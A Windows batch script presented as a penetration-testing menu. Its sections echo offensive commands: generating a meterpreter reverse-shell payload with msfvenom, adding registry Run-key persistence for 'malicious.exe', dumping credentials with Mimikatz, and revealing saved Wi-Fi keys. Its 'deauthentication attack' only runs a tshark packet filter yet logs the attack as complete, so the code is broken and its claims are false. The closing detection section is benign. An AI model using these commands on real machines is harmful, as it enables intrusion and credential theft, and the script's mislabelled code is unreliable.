@echo off
mode 80, 30
title Advanced Penetration Testing Toolkit
chcp 65001 >nul

:start
cls
echo.
echo.
echo [34m┌───────────────────────────────────────────────────────────────────┐[0m
echo [34m│ [96m██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ ███████╗ [34m│[0m
echo [34m│ [96m██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝ [34m│[0m
echo [34m│ [96m██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╗    [34m│[0m
echo [34m│ [96m██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔═══╝ ██╔══╝    [34m│[0m
echo [34m│ [96m██║     ███████╗██║ ╚████║   ██║   ███████╗██║     ███████╗ [34m│[0m
echo [34m│ [96m╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ [34m│[0m
echo [34m└───────────────────────────────────────────────────────────────────┘[0m
echo.
echo [96m       Select an Option Below to Explore Tools and Techniques[0m
echo.
ping localhost -n 1 >nul
echo     [90;1m#═╦═══════»[0m  [92m[Network Scanning][0m        [95m[1][0m
ping localhost -n 1 >nul
echo       [90;1m╚═╦══════»[0m  [92m[Password Attacks][0m       [95m[2][0m
ping localhost -n 1 >nul
echo         [90;1m╚═╦═════»[0m  [92m[Privilege Escalation][0m   [95m[3][0m
ping localhost -n 1 >nul
echo           [90;1m╚═╦════»[0m  [92m[Exploitation][0m          [95m[4][0m
ping localhost -n 1 >nul
echo             [90;1m╚═╦═══»[0m  [92m[Post-Exploitation][0m     [95m[5][0m
ping localhost -n 1 >nul
echo               [90;1m╚═╦═»[0m  [92m[Wi-Fi Tools][0m          [95m[6][0m
ping localhost -n 1 >nul
echo                 [90;1m╚═╦»[0m  [92m[Logging & Reporting][0m  [95m[7][0m
ping localhost -n 1 >nul
echo                   [90;1m╚═╦»[0m  [92m[Wi-Fi Attack Script][0m [95m[8][0m
ping localhost -n 1 >nul
echo                     [90;1m╚═╦»[0m  [92m[Wi-Fi Detection & Mitigation][0m[95m[9][0m
ping localhost -n 1 >nul
echo                     [90;1m╚═»[0m  [92m[Exit][0m              [95m[0][0m
echo|set /p=".                      [90;1m╚══>[0m"
choice /c 123456789 /n >nul
set choice=%errorlevel%

if %choice%==1 goto network_scanning
if %choice%==2 goto password_attacks
if %choice%==3 goto privilege_escalation
if %choice%==4 goto exploitation
if %choice%==5 goto post_exploitation
if %choice%==6 goto wifi_tools
if %choice%==7 goto logging
if %choice%==8 goto wifi_attack
if %choice%==9 goto wifi_detection_mitigation
if %choice%==0 exit

:wifi_attack
cls
echo ============================================================
echo                 Wi-Fi Attack Script (Educational)
echo ============================================================
echo [96mThis script demonstrates a Wi-Fi deauthentication attack.[0m
echo [92mRequirements:[0m
echo  - Install Wireshark and TShark
echo  - Wireless adapter supporting monitor mode
echo  - Run the script as Administrator
echo.
echo [93m[+] Options:[0m
echo  [1] Broadcast Attack - Disconnect all devices
echo  [2] Targeted Attack  - Disconnect a specific device
echo.
set /p "attack_type=Select an option (1 or 2): "

if "%attack_type%"=="1" (
    echo Starting broadcast deauthentication attack...
    powershell -Command ^
    "if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
    Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.fc.type_subtype==12'"
    echo Attack complete. >> wifi_attack_log.txt
    echo Deauthentication attack logged to wifi_attack_log.txt.
) else if "%attack_type%"=="2" (
    set /p "target_mac=Enter target MAC address: "
    echo Starting targeted deauthentication attack on %target_mac%...
    powershell -Command ^
    "if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
    Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.addr == %target_mac%'"
    echo Targeted attack on %target_mac% logged to wifi_attack_log.txt.
    echo Deauthentication attack logged to wifi_attack_log.txt.
)
pause
goto start

:network_scanning
cls
echo ============================================================
echo                  Network Scanning & Recon
echo ============================================================
echo [92m[+] View Network Configurations[0m:
echo    ipconfig /all
echo.
pause
goto start

:password_attacks
cls
echo ============================================================
echo                     Password Attacks
echo ============================================================
echo [92m[+] Credential Dumping[0m:
echo    Use Mimikatz or similar tools for dumping credentials.
pause
goto start

:privilege_escalation
cls
echo ============================================================
echo                Privilege Escalation Techniques
echo ============================================================
echo [92m[+] Simulate UAC Bypass[0m:
echo    powershell -Command "Start-Process cmd -Verb runAs"
pause
goto start

:exploitation
cls
echo ============================================================
echo                     Exploitation
echo ============================================================
echo [92m[+] Generate Payloads[0m:
echo    msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe
pause
goto start

:post_exploitation
cls
echo ============================================================
echo                 Post-Exploitation Tools
echo ============================================================
echo [92m[+] Persist via Registry[0m:
echo    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d "cmd.exe /c malicious.exe"
pause
goto start

:wifi_tools
cls
echo ============================================================
echo                     Wi-Fi Tools
echo ============================================================
echo [92m[+] Retrieve Stored Wi-Fi Passwords[0m:
echo    netsh wlan show profiles
echo    netsh wlan show profile name="WiFiName" key=clear
pause
goto start

:logging
cls
echo ============================================================
echo                 Logging & Reporting Tools
echo ============================================================
echo [92m[+] Log Network Activity[0m:
echo    netstat -an > network_log.txt
pause
goto start


:wifi_detection_mitigation
cls
echo ============================================================
echo          Wi-Fi Detection & Mitigation Tools
echo ============================================================
echo [96mThis section includes tools to detect and mitigate Wi-Fi attacks.[0m
echo [92m[1] Detect Deauthentication Packets[0m
echo [92m[2] Mitigate Rogue Devices[0m
echo [92m[3] Advanced ARP Spoofing Detection (e.g., SelfishNet)[0m
echo [92m[4] Advanced Bandwidth Monitoring[0m
echo [92m[5] Return to Main Menu[0m
echo.
set /p "wifi_option=Select an option: "

:: Detect Deauthentication Packets
if "%wifi_option%"=="1" (
    cls
    echo Detecting deauthentication packets...
    echo Results will be logged in wifi_attack_log.txt.
    powershell -Command ^
    "if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
    Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.fc.type_subtype==12 -T fields -e wlan.sa -e wlan.da -e frame.time' | ForEach-Object { ^
      Add-Content -Path wifi_attack_log.txt -Value ($_ + ' - Timestamp: ' + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) }"
    echo Detection complete. Logs saved to wifi_attack_log.txt.
    pause
    goto wifi_detection_mitigation
)

:: Mitigate Rogue Devices
if "%wifi_option%"=="2" (
    cls
    echo Mitigating rogue devices...
    echo Checking for unauthorized devices...
    arp -a | findstr /V "00-00-00-00-00-00" > rogue_devices.txt
    echo Rogue devices logged in rogue_devices.txt.
    echo Mitigation strategies:
    echo  - Block suspicious MACs using router settings.
    echo  - Enable WPA3 or WPA2 with MFP (Management Frame Protection).
    pause
    goto wifi_detection_mitigation
)

:: Advanced ARP Spoofing Detection
if "%wifi_option%"=="3" (
    cls
    echo Detecting ARP spoofing attacks (e.g., SelfishNet)...
    echo Scanning for duplicate MAC addresses...
    powershell -Command ^
    "arp -a | Out-File -FilePath arp_table.txt; ^
    $arpData = Get-Content arp_table.txt | ForEach-Object { ($_ -split '\s+') | Select-String '.{17}' }; ^
    $duplicates = $arpData | Group-Object | Where-Object { $_.Count -gt 1 }; ^
    if ($duplicates.Count -gt 0) { ^
        $duplicates | ForEach-Object { Add-Content -Path 'arp_spoof_log.txt' -Value ('Duplicate MAC Found: ' + $_.Name + ' - IPs: ' + ($_.Group -join ', ')) }; ^
        Write-Host 'ALERT! ARP spoofing detected. Check arp_spoof_log.txt.' -ForegroundColor Red } else { ^
        Write-Host 'No ARP spoofing detected.' -ForegroundColor Green }"
    pause
    goto wifi_detection_mitigation
)

:: Advanced Bandwidth Monitoring
if "%wifi_option%"=="4" (
    cls
    echo Monitoring bandwidth usage for suspicious activity...
    echo Checking for throttling or unusual traffic patterns...
    powershell -Command ^
    "Get-NetTCPConnection | Sort-Object -Property State | Out-File -FilePath 'bandwidth_log.txt'; ^
    Write-Host 'Bandwidth usage logged in bandwidth_log.txt.' -ForegroundColor Green"
    echo Bandwidth monitoring complete.
    pause
    goto wifi_detection_mitigation
)

if "%wifi_option%"=="5" goto start
